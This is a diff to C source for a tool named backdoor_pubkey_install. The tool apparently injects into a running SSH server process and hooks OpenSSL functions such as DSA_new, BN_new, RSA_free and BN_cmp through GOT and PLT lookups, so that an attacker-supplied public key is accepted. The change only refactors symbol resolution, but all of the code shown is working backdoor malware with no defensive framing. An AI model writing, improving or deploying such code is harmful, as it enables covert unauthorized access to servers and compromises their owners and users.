@@ -17,6 +17,7 @@
 extern unsigned char hook_pubkey_bin[];
 extern int hook_pubkey_bin_len;
 
+
 void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
 		{ 0x1, "key_allowed", "trying public key file %s", 0 },
@@ -49,13 +50,8 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 
 			switch(i) {
 				case 2: // key_new
-					f_dsa_new = resolve_reloc(
-						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_new"
-					);
-
-					f_bn_new = resolve_reloc(
-						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "BN_new"
-					);
+					f_dsa_new = resolve_reloc_all(ctx, "DSA_new");
+					f_bn_new = resolve_reloc_all(ctx, "BN_new");
 
 					info("DSA_new@got = 0x%lx", f_dsa_new);
 					info("BN_new@got = 0x%lx", f_bn_new);
@@ -78,13 +74,8 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 				break;
 
 				case 4: // key_free
-					p_rsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc(
-						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "RSA_free"
-					));
-
-					p_dsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc(
-						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_free"
-					));
+					p_rsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc_all(ctx, "RSA_free"));
+					p_dsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc_all(ctx, "DSA_free"));
 
 					info("RSA_free@plt = 0x%lx", p_rsa_free);
 					info("DSA_free@plt = 0x%lx", p_dsa_free);
@@ -130,7 +121,7 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 		info(line);
 	}
 
-	u64 f_BN_cmp = resolve_reloc(ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "BN_cmp");
+	u64 f_BN_cmp = resolve_reloc_all(ctx, "BN_cmp");
 	info("BN_cmp@got = 0x%lx", f_BN_cmp);
 	u64 l_BN_cmp;
 	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
